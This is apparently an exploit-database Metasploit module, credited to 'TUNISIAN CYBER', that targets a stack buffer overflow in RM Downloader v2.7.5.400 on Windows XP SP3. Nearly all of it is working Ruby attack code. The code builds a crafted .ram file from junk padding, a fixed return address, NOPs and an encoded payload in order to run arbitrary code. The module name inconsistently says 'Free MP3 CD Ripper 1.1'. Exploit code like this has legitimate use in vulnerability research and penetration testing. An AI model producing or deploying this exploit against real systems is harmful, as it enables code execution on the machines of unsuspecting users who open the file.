#[+] Author: TUNISIAN CYBER
#[+] Exploit Title: RM Downloader v2.7.5.400 Local Buffer Overflow (MSF)
#[+] Date: 25-03-2015
#[+] Type: Local Exploits
#[+] Tested on: WinXp/Windows 7 Pro
#[+] Vendor: http://software-files-a.cnet.com/s/software/10/65/60/49/Mini-streamRM-MP3Converter.exe?token=1427318981_98f71d0e10e2e3bd2e730179341feb0a&fileName=Mini-streamRM-MP3Converter.exe
#[+] Twitter: @TCYB3R
##
  
##
# $Id: rmdownloader_bof.rb  2015-04-01 03:03  TUNISIAN CYBER $
##
  
require &#039;msf/core&#039;
   
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
   
  include Msf::Exploit::FILEFORMAT
   
   def initialize(info = {})
    super(update_info(info,
     &#039;Name&#039; => &#039;Free MP3 CD Ripper 1.1 Local Buffer Overflow Exploit&#039;,
         &#039;Description&#039; => %q{
          This module exploits a stack buffer overflow in RM Downloader v2.7.5.400
          creating a specially crafted .ram file, an attacker may be able 
      to execute arbitrary code.
        },
     &#039;License&#039; => MSF_LICENSE,
     &#039;Author&#039; => 
           [
            &#039;TUNISIAN CYBER&#039;, # Original
            &#039;TUNISIAN CYBER&#039; # MSF Module
            ],
     &#039;Version&#039; => &#039;Version 2.7.5.400&#039;,
     &#039;References&#039; =>
        [
         [ &#039;URL&#039;, &#039;https://www.exploit-db.com/exploits/36502/&#039; ],
        ],
    &#039;DefaultOptions&#039; =>
       {
        &#039;EXITFUNC&#039; => &#039;process&#039;,
       },
     &#039;Payload&#039; =>
      {
        &#039;Space&#039; => 1024,
        &#039;BadChars&#039; => "\x00\x0a\x0d",
        &#039;StackAdjustment&#039; => -3500,
      },
     &#039;Platform&#039; => &#039;win&#039;,
     &#039;Targets&#039; =>
       [
        [ &#039;Windows XP-SP3 (EN)&#039;, { &#039;Ret&#039; => 0x7C9D30D7} ]
       ],
      &#039;Privileged&#039; => false,
      &#039;DefaultTarget&#039; => 0))
   
      register_options(
       [
        OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.ram&#039;]),
       ], self.class)
    end
   
    def exploit
  
    sploit = rand_text_alphanumeric(35032) # Buffer Junk
      sploit << [target.ret].pack(&#039;V&#039;)
      sploit << make_nops(4)
      sploit << payload.encoded
  
      tc = sploit
      print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
      file_create(tc)
  
    end
   
end

